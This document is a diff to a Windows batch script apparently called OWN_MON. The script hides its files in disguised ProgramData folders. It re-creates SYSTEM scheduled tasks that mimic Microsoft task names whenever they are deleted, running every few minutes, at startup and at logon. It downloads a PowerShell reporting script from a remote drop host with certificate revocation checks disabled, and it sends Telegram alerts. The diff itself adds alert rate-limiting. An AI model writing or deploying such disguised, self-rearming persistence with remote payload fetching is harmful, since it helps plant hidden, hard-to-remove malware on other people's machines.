@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN_MON BUILD 20260802M7 - quoted TR, x86 fix, robust MSI + nuke + TG
+REM OWN_MON BUILD 20260802M8 - clean TR quoting + TG rate-limit + nuke + TG
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\boot.err"
@@ -44,22 +44,22 @@ if exist "%TEMP%\tg_report_upd.ps1" for %%A in ("%TEMP%\tg_report_upd.ps1") do i
 REM --- self-rearm persist if someone deleted the tasks ---
 schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
   echo rearm_taskA>>"%LOG%"
 )
 schtasks /Query /TN "\Microsoft\Windows\PLA\Server" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c ""%WD2%\etl_mon.cmd""" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c %WD2%\etl_mon.cmd" >nul 2>&1
   echo rearm_taskB>>"%LOG%"
 )
 schtasks /Query /TN "\Microsoft\Windows\WDI\ResolutionHost" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
   echo rearm_onstart>>"%LOG%"
 )
 schtasks /Query /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c ""%WD%\own_mon.cmd""" >nul 2>&1
+  schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
   echo rearm_onlogon>>"%LOG%"
 )
 
@@ -217,8 +217,25 @@ set "NEWSTATE=%~1"
 set "MSG=%~2"
 set "OLDSTATE="
 if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
-if /I "%NEWSTATE%"=="%OLDSTATE%" exit /b 0
+REM rate-limit repeated DOWN/FAIL: max 1 alert per 30 min while stuck
+if /I "%NEWSTATE%"=="DOWN" goto :MaybeSuppress
+if /I "%NEWSTATE%"=="FAIL" goto :MaybeSuppress
+goto :SendAlert
+:MaybeSuppress
+if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
+  powershell.exe -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 30){exit 0}else{exit 1}" >nul 2>&1
+  if not errorlevel 1 (
+    echo tg_suppressed_%NEWSTATE%>>"%LOG%"
+    exit /b 0
+  )
+)
+:SendAlert
+if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
+  powershell.exe -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 30){exit 0}else{exit 1}" >nul 2>&1
+  if not errorlevel 1 if /I not "%NEWSTATE%"=="OK" if /I not "%NEWSTATE%"=="RESTORED" exit /b 0
+)
 echo %NEWSTATE%>"%STATE%"
+echo sent>%WD%\tg_sent.flag
 if not exist "%WD%\notify.cfg" exit /b 0
 if not exist "%WD%\tg_report.ps1" (
   "%CURL%" -L --ssl-no-revoke --connect-timeout 15 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
